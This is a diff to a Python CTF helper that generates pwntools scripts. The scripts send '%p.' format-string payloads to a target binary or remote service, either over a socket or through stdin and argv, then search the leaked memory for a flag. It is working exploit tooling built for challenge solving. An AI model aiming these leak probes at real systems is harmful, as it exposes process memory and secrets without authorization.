@@ -169,26 +169,63 @@ def _probe_network(path, host, port, log) -> tuple[str, str | None]:
 def _emit_probe_script(path, info, is_net, host, port) -> str:
     arch = {"x86_64": "amd64", "x86": "i386"}.get(info["arch"], info["arch"])
     if is_net:
-        target = f"remote({host!r}, {port or 9999})"
-        setup = f"# start the service first:  {path} {port or 9999}"
-    else:
-        target = f"process({path!r})"
-        setup = ""
-    return (
-        textwrap.dedent(
-            f'''
+        body = f'''
             import re, sys
-            from pwn import context, process, remote  # noqa: F401
+            from pwn import context, remote
             context.update(arch="{arch}", log_level="warning")
-            {setup}
-            io = {target}
+            # start the service first:  {path} {port or 9999}
+            io = remote({host!r}, {port or 9999})
             io.sendline(b"%p." * 60)
-            data = io.recvall(timeout=5)
+            try:
+                data = io.recvall(timeout=5)
+            except EOFError:
+                data = b""
             io.close()
             sys.stdout.buffer.write(data)
             m = re.search(rb"(flag|FLAG|CTF)\\{{[^}}]*}}|FLAG-[\\w?.!-]+", data)
             print("\\nFLAG:", m.group(0).decode() if m else "not in this leak - widen %N$p range")
-            '''
-        ).strip()
-        + "\n"
-    )
+        '''
+        return textwrap.dedent(body).strip() + "\n"
+
+    # Local stdin target. The format-string sink may only run via argv, not
+    # stdin (e.g. `int main(argc, argv) { if (argc > 1) vuln(argv[1]); }`),
+    # which closes stdin almost immediately — sendline() can then raise
+    # BrokenPipeError, not just EOFError on the later read. The %p payload
+    # itself has no embedded NUL bytes, so (unlike a ret2win address write)
+    # delivering it via a single argv element is always safe.
+    body = f'''
+        import re, sys
+        from pwn import context, process
+        context.update(arch="{arch}", log_level="warning")
+        exe = {path!r}
+        # Deliberately modest: the format-string argument is often also a
+        # bounded-copy sink (e.g. strcpy'd into a small stack buffer before
+        # the printf call) — a long %p.%p... payload can overflow that
+        # buffer and crash the process before stdio flushes, silently
+        # discarding the very leak it produced. 16 conversions (48 bytes)
+        # fits inside the smallest buffers this still realistically needs
+        # to probe; "widen %N$p range" below says what to do if it's not
+        # enough for a specific target.
+        PAYLOAD = b"%p." * 16
+
+        def attempt(use_argv):
+            p = process([exe, PAYLOAD] if use_argv else exe)
+            try:
+                if not use_argv:
+                    p.sendline(PAYLOAD)
+                data = p.recvall(timeout=5)
+            except (EOFError, OSError):
+                data = b""
+            finally:
+                p.close()
+            return data
+
+        FLAG = re.compile(rb"(flag|FLAG|CTF)\\{{[^}}]*}}|FLAG-[\\w?.!-]+")
+        data = attempt(False)
+        if not FLAG.search(data):
+            data += b"\\n" + attempt(True)
+        sys.stdout.buffer.write(data)
+        m = FLAG.search(data)
+        print("\\nFLAG:", m.group(0).decode() if m else "not in this leak - widen %N$p range")
+    '''
+    return textwrap.dedent(body).strip() + "\n"
